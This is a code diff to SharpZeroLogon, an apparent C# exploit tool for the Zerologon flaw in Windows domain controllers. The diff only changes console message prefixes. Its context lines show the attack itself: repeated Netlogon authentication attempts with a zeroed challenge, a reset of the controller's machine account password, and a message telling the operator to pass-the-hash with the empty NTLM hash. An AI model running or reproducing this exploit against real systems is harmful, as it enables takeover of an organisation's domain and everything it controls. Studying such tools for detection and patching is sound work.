@@ -14,7 +14,7 @@ namespace SharpZeroLogon
         {
             if (args.Length < 1)
             {
-                Console.WriteLine(" Usage: SharpZeroLogon.exe <target dc fqdn> <optional: -reset> <optional: -listdc>");
+                Console.WriteLine("[-] Usage: SharpZeroLogon.exe <target dc fqdn> <optional: -reset> <optional: -listdc>");
                 return;
             }
 
@@ -47,14 +47,14 @@ namespace SharpZeroLogon
                         {
                             using (dc)
                             {
-                                Console.WriteLine($"Name : {dc.Name} | IP : {dc.IPAddress} | Forest : {dc.Forest} | OS : {dc.OSVersion}");
+                                Console.WriteLine($"[+] Name : {dc.Name} | IP : {dc.IPAddress} | Forest : {dc.Forest} | OS : {dc.OSVersion}");
                             }
                         }
                     }
                 }
                 catch
                 {
-                    Console.WriteLine("Look like this Computer is not part of a domain");
+                    Console.WriteLine("[-] Look like this System is not part of a domain");
                 }
                 return;
             }
@@ -63,13 +63,13 @@ namespace SharpZeroLogon
             NETLOGON_CREDENTIAL ServerChallenge = new NETLOGON_CREDENTIAL();
             ulong NegotiateFlags = 0x212fffff;
 
-            Console.WriteLine("Performing authentication attempts...");
+            Console.WriteLine("[+] Performing authentication attempts...");
 
             for (int i = 0; i < 2000; i++)
             {
                 if (I_NetServerReqChallenge(fqdn, hostname, ref ClientChallenge, ref ServerChallenge) != 0)
                 {
-                    Console.WriteLine("Unable to complete Challenge. Invalid name or DNS issues?");
+                    Console.WriteLine("[-] Unable to complete Challenge. Invalid name or DNS issues?");
                     return;
                 }
                 Console.Write("=");
@@ -77,7 +77,7 @@ namespace SharpZeroLogon
                 if (I_NetServerAuthenticate2(fqdn, hostname + "$", NETLOGON_SECURE_CHANNEL_TYPE.ServerSecureChannel,
                     hostname, ref ClientChallenge, ref ServerChallenge, ref NegotiateFlags) == 0)
                 {
-                    Console.WriteLine($"\nBad or Good news DC {hostname} is vulnerable to Zerologon attack.");
+                    Console.WriteLine($"\n[+] Bad or Good news DC {hostname} is vulnerable to Zerologon attack.");
                     return;
                 }
 
@@ -96,14 +96,14 @@ namespace SharpZeroLogon
                         ref ClearNewPassword
                         ) == 0)
                     {
-                        Console.WriteLine($"Look like we have a success, NTLM has been Reset with Success :\n Now serveur is exposed => Use : pth {hostname}$ 31d6cfe0d16ae931b73c59d7e0c089c0");
+                        Console.WriteLine($"[+] Look like we have a success, NTLM has been Reset with Success :\n Now serveur is exposed => Use : pth {hostname}$ 31d6cfe0d16ae931b73c59d7e0c089c0");
                         return;
                     }
                     Console.Clear();
-                    Console.WriteLine("Failed to reset machine account password");
+                    Console.WriteLine("[-] Failed to reset machine account password");
                 }
             }
-            Console.WriteLine("\nAttack failed. Target is prolly Patched.");
+            Console.WriteLine("\n[-] Attack failed. Target is prolly Patched.");
         }
     }
 }
